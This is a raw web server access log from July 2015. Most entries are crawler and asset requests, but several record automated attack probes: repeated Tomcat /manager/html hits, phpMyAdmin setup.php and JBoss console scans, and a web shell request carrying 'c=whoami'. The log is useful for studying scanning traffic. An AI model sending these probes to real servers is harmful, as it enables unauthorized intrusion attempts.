222.186.21.41 - - [21/Jul/2015:07:29:59 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:30:04 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:30:10 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:30:15 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:30:21 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [21/Jul/2015:07:30:26 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
151.80.31.152 - - [21/Jul/2015:08:17:25 +0000] "GET /tijuana/27-06-2015/recuperan-belleza-de-todos-santos-norte HTTP/1.1" 404 493 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.152 - - [21/Jul/2015:08:25:21 +0000] "GET /ciudad/tijuana?page=1329 HTTP/1.1" 404 449 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
54.198.56.179 - - [21/Jul/2015:08:30:03 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
151.80.31.152 - - [21/Jul/2015:10:19:44 +0000] "GET /tijuana/26-06-2015/mexico-sa HTTP/1.1" 404 463 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.152 - - [21/Jul/2015:10:31:47 +0000] "GET /content/aviso-de-privacidad HTTP/1.1" 404 462 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.152 - - [21/Jul/2015:11:22:49 +0000] "GET /tijuana/28-06-2015/fin-al-bloqueo-la-isla-pide-la-parlamentaria-mexico-cuba HTTP/1.1" 404 510 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
54.144.136.85 - - [21/Jul/2015:12:31:31 +0000] "GET / HTTP/1.1" 200 308 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)"
151.80.31.152 - - [21/Jul/2015:12:47:32 +0000] "GET /tijuana/27-06-2015/detienen-en-jalisco-cura-pedofilo HTTP/1.1" 404 487 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
209.126.230.71 - - [21/Jul/2015:12:56:00 +0000] "GET / HTTP/1.0" 200 308 "-" "StatsInfo"
207.248.58.83 - - [21/Jul/2015:13:23:07 +0000] "GET /sites/all/themes/lajornada/css/images/twitter_header.png HTTP/1.1" 404 547 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [21/Jul/2015:13:55:46 +0000] "GET /sites/all/themes/lajornada/css/images/lupa.png HTTP/1.1" 404 537 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [21/Jul/2015:17:23:43 +0000] "GET /sites/all/themes/lajornada/css/images/facebook_header.png HTTP/1.1" 404 548 "-" "Mozilla/4.0 (compatible;)"
188.209.49.50 - - [21/Jul/2015:18:07:38 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 481 "-" "Mozilla/5.0 (Windows NT 5.1)"
155.201.35.185 - - [22/Jul/2015:00:30:12 +0000] "GET /sites/default/files/js/js_xAPl0qIk9eowy_iS9tNkCWXLUVoat94SQT48UBCFkyQ.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
46.172.71.251 - - [22/Jul/2015:01:20:53 +0000] "GET /rom-0 HTTP/1.1" 404 459 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.74.238.8 - - [22/Jul/2015:01:46:10 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/3.0 (compatible; Indy Library)"
201.140.81.153 - - [22/Jul/2015:04:21:37 +0000] "GET /sites/default/files/styles/148x99/public/images/los-hermanos-flores-magon.png?itok=igIp7_UU HTTP/1.1" 404 568 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [22/Jul/2015:05:12:36 +0000] "GET /sites/default/files/favicon.ico HTTP/1.1" 404 522 "-" "Mozilla/4.0 (compatible;)"
151.80.31.152 - - [22/Jul/2015:06:39:45 +0000] "GET /tijuana/26-06-2015/sedena-debera-entregar-version-publica-de-hechos-ocurridos-en-tlatlaya HTTP/1.1" 404 524 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
155.201.35.185 - - [22/Jul/2015:12:08:55 +0000] "GET /sites/all/themes/lajornada/css/images/lajornadaBC_ch.png HTTP/1.1" 404 547 "-" "Mozilla/4.0 (compatible;)"
54.80.255.156 - - [22/Jul/2015:16:28:25 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
80.82.78.164 - - [22/Jul/2015:16:41:18 +0000] "GET /muieblackcat HTTP/1.1" 404 466 "-" "-"
80.82.78.164 - - [22/Jul/2015:16:41:19 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 404 482 "-" "-"
80.82.78.164 - - [22/Jul/2015:16:41:19 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 404 482 "-" "-"
80.82.78.164 - - [22/Jul/2015:16:41:19 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 404 475 "-" "-"
80.82.78.164 - - [22/Jul/2015:16:41:20 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 404 479 "-" "-"
80.82.78.164 - - [22/Jul/2015:16:41:20 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 404 479 "-" "-"
182.118.53.78 - - [22/Jul/2015:18:48:05 +0000] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
151.80.31.153 - - [22/Jul/2015:22:06:54 +0000] "GET /tijuana/16-06-2015/profepa-clausura-la-extraccion-de-roca-volcanica-en-bc HTTP/1.1" 404 508 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [22/Jul/2015:22:28:17 +0000] "GET /carton/25-06-2015/cielos-mexicanos HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
200.23.91.182 - - [22/Jul/2015:22:33:03 +0000] "GET /modules/poll/poll.css?nm2iu1 HTTP/1.1" 404 512 "-" "Mozilla/4.0 (compatible;)"
151.80.31.153 - - [22/Jul/2015:23:26:24 +0000] "GET /tijuana/24-06-2015/el-paquete-california-podria-ser-ejemplo-para-otros-estados-de-eu HTTP/1.1" 404 519 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [23/Jul/2015:00:14:32 +0000] "GET /tijuana/27-06-2015/aspirantes-consejeros-electorales-de-bc-realizan-examen-de-conocimientos HTTP/1.1" 404 526 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
151.80.31.153 - - [23/Jul/2015:01:14:08 +0000] "GET /node/11439/results HTTP/1.1" 404 453 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)"
115.29.184.109 - - [23/Jul/2015:01:49:02 +0000] "GET /web-console/ServerInfo.jsp HTTP/1.1" 404 461 "52.10.36.255:80/web-console/ServerInfo.jsp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
115.29.184.109 - - [23/Jul/2015:01:49:03 +0000] "GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1" 404 458 "http://52.10.36.255:80/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
115.29.184.109 - - [23/Jul/2015:01:49:03 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 404 460 "52.10.36.255:80/invoker/JMXInvokerServlet" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 2Pac; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)"
54.225.5.40 - - [23/Jul/2015:04:24:16 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
200.23.91.182 - - [23/Jul/2015:05:30:19 +0000] "GET /modules/search/search.css?nm2iu1 HTTP/1.1" 404 516 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [23/Jul/2015:05:54:37 +0000] "GET /sites/default/files/favicon.ico HTTP/1.1" 404 522 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [23/Jul/2015:06:27:30 +0000] "GET /sites/all/themes/lajornada/css/images/lajornadaBC_ch.png HTTP/1.1" 404 547 "-" "Mozilla/4.0 (compatible;)"
117.21.191.204 - - [23/Jul/2015:09:10:25 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/3.0 (compatible; Indy Library)"
141.212.122.170 - - [23/Jul/2015:09:34:35 +0000] "GET /x HTTP/1.1" 400 0 "-" "Telesphoreo"
200.23.91.182 - - [23/Jul/2015:11:56:17 +0000] "GET /modules/field/theme/field.css?nm2iu1 HTTP/1.1" 404 520 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [23/Jul/2015:12:20:08 +0000] "GET /sites/all/themes/lajornada/fonts/Open_Sans/OpenSans-Bold.ttf?1422953409 HTTP/1.1" 404 551 "-" "Mozilla/4.0 (compatible;)"
200.23.91.182 - - [23/Jul/2015:13:01:32 +0000] "GET /modules/user/user.css?nm2iu1 HTTP/1.1" 404 512 "-" "Mozilla/4.0 (compatible;)"
89.248.167.159 - - [23/Jul/2015:13:22:57 +0000] "GET / HTTP/1.0" 200 308 "-" "-"
54.144.23.48 - - [23/Jul/2015:20:31:03 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
222.186.21.41 - - [24/Jul/2015:07:50:44 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:50:49 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:50:55 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:01 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:07 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:12 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:18 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:23 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:29 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:34 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:40 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:45 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:50 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:51:56 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:01 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:07 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:12 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:17 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:23 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:29 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:35 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:40 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:45 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:07:52:51 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:11 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:16 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:22 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:28 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:33 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:39 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:44 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:50 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
222.186.21.41 - - [24/Jul/2015:08:07:57 +0000] "GET /manager/html HTTP/1.1" 404 442 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
23.20.72.246 - - [24/Jul/2015:08:28:56 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
198.20.70.114 - - [24/Jul/2015:10:28:40 +0000] "GET / HTTP/1.1" 200 289 "-" "-"
198.20.70.114 - - [24/Jul/2015:10:28:40 +0000] "GET /robots.txt HTTP/1.1" 404 445 "-" "-"
198.20.70.114 - - [24/Jul/2015:10:28:40 +0000] "GET /sitemap.xml HTTP/1.1" 404 446 "-" "-"
141.212.121.144 - - [24/Jul/2015:13:04:11 +0000] "GET / HTTP/1.1" 200 289 "-" "-"
117.21.191.204 - - [24/Jul/2015:14:02:37 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/3.0 (compatible; Indy Library)"
200.23.91.182 - - [24/Jul/2015:15:03:49 +0000] "GET /sites/default/files/js/js_xAPl0qIk9eowy_iS9tNkCWXLUVoat94SQT48UBCFkyQ.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
104.192.0.226 - - [24/Jul/2015:16:26:19 +0000] "GET /admin/bootstrap.inc.php?mgp=danc3Uf@t&c=whoami HTTP/1.0" 404 505 "-" "-"
201.140.81.153 - - [24/Jul/2015:16:41:23 +0000] "GET /sites/default/files/css/css_xL5fITRH7_twemt1IEkHohY3QONG9UcJkHOvS7lk0nI.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
182.118.60.59 - - [24/Jul/2015:17:07:42 +0000] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
201.140.81.153 - - [24/Jul/2015:18:01:50 +0000] "GET /sites/default/files/js/js_xAPl0qIk9eowy_iS9tNkCWXLUVoat94SQT48UBCFkyQ.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [25/Jul/2015:00:15:26 +0000] "GET /sites/all/themes/lajornada/css/images/lupa.png HTTP/1.1" 404 537 "-" "Mozilla/4.0 (compatible;)"
141.212.122.50 - - [25/Jul/2015:04:16:16 +0000] "GET /x HTTP/1.1" 400 0 "-" "Telesphoreo"
200.23.91.182 - - [25/Jul/2015:04:59:14 +0000] "GET /sites/default/files/js/js_-QTOW7v2Syq9KuhK8fQW0JdnW1L-cffgNJhRbx3lXCM.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
141.212.122.66 - - [25/Jul/2015:07:00:17 +0000] "CONNECT google.com:443 HTTP/1.1" 405 510 "-" "-"
201.140.81.153 - - [25/Jul/2015:07:57:41 +0000] "GET /sites/default/files/js/js_-QTOW7v2Syq9KuhK8fQW0JdnW1L-cffgNJhRbx3lXCM.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
54.146.8.158 - - [25/Jul/2015:12:07:55 +0000] "HEAD / HTTP/1.1" 200 226 "-" "Cloud mapping experiment. Contact research@pdrlabs.net"
23.253.163.53 - - [25/Jul/2015:13:09:17 +0000] "GET / HTTP/1.1" 200 289 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.3.50) Gecko/20101046 Firefox/3.6.99 GTB7"
117.21.191.204 - - [25/Jul/2015:13:39:58 +0000] "GET /manager/html HTTP/1.1" 404 447 "-" "Mozilla/3.0 (compatible; Indy Library)"
93.113.125.11 - - [25/Jul/2015:13:45:08 +0000] "GET /nowherereally HTTP/1.0" 404 495 "-" "\"nlpproject.info research\""
207.248.58.83 - - [25/Jul/2015:13:51:33 +0000] "GET /sites/all/themes/lajornada/fonts/Bitter/Bitter-Regular.ttf?1422953409 HTTP/1.1" 404 549 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [25/Jul/2015:19:21:35 +0000] "GET /sites/default/files/css/css_RroIhOS-mZGnGW3HRUKhjzHVuuWLqJVCXWMpIjLit2A.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [25/Jul/2015:19:28:25 +0000] "GET /sites/all/themes/lajornada/fonts/Open_Sans/OpenSans-Regular.ttf?1422953409 HTTP/1.1" 404 554 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [25/Jul/2015:19:38:56 +0000] "GET /sites/default/files/css/css_66VZvj_-3ono9uq1P-zJUCdMXFghnM_xeEdtzgRpR4c.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
207.248.58.83 - - [25/Jul/2015:20:33:55 +0000] "GET /sites/all/themes/lajornada/fonts/Open_Sans/OpenSans-Bold.ttf?1422953409 HTTP/1.1" 404 551 "-" "Mozilla/4.0 (compatible;)"
201.140.81.153 - - [25/Jul/2015:21:14:35 +0000] "GET /sites/default/files/js/js_4G0J-9LmZhogmlLPnVlAVlummXImn5iua9mmkX1rclA.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
128.223.223.126 - - [25/Jul/2015:22:19:04 +0000] "GET /foo.html HTTP/1.1" 200 428 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
128.223.223.126 - - [25/Jul/2015:22:19:04 +0000] "GET /favicon.ico HTTP/1.1" 404 537 "http://ec2-52-10-36-255.us-west-2.compute.amazonaws.com/foo.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
128.223.223.126 - - [25/Jul/2015:22:19:17 +0000] "GET / HTTP/1.1" 200 345 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36"
155.201.35.185 - - [26/Jul/2015:01:41:46 +0000] "GET /sites/default/files/js/js_4G0J-9LmZhogmlLPnVlAVlummXImn5iua9mmkX1rclA.js HTTP/1.1" 404 563 "-" "Mozilla/4.0 (compatible;)"
155.201.35.185 - - [26/Jul/2015:02:13:07 +0000] "GET /sites/default/files/css/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css HTTP/1.1" 404 566 "-" "Mozilla/4.0 (compatible;)"
